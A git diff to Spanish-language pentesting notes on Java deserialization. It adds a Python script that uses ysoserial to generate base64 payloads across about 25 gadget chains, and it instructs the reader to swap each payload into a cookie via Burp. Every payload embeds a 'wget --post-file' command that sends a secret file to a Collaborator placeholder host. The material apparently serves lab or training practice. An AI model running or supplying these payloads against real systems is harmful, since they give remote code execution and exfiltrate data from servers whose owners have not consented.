@@ -19,6 +19,37 @@ Para reconocer posibles puntos de entrada para su exploit, busque firmas que ten
 - La firma comienza con AC ED 00 05 en hexadecimal o ro0 en Base64 (por ejemplo, puede encontrarlas dentro de solicitudes HTTP como cookies o parámetros)
 - Encabezado de tipo de contenido de una respuesta HTTP establecida en application/x-java-serialized-object.
 ## Script To Brute Force JAVA Deserialization: 
+
+- Despues de correr el script, coger cada uno de los scripts de 'exploitInBase64.txt' y probarlos sustituyendo la cookie en una solicitud normal en Burp (sin olvidar **URL-ENCODEARLOS!!!**)
+```python
+#!/bin/python3
+import os
+
+burp_collab_link = "<COLLABORATOR-URL>"
+jar_filename = "ysoserial-all.jar"
+filename = "exploitsInBase64.txt"
+open(filename, 'w').close()
+
+# Payloads que aceptan un comando de shell "crudo" vía Runtime.exec(String)
+payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1',
+            'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4',
+            'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7',
+            'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JSON1',
+            'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2',
+            'Myfaces1', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Click1']
+
+for p in payloads:
+    rceCommand_exfiltrateFile = f"wget --post-file /home/carlos/secret {p}.{burp_collab_link}"
+    cmdOnServer = rceCommand_exfiltrateFile
+
+    os.system(f"echo \\#{p} >> {filename}")
+    command = f"java -jar {jar_filename} {p} '{cmdOnServer}' | gzip -f | base64 | tr --delete '\\n' >> {filename}"
+    os.system(command)
+    for i in range(2):
+        os.system(f"echo >> {filename}")
+```
+
+
 ```python
 #!/bin/python3
 import os, random
@@ -42,7 +73,7 @@ for p in payloads:
 
     cmdOnServer =  rceCommand_exfiltrateFile # CHANGE
 
-    os.system(f"echo \#{p} >> {filename}")
+    os.system(f"echo \\#{p} >> {filename}")
 
     ####### commment 1 of the commands # CHANGE
     # Gzip the base64
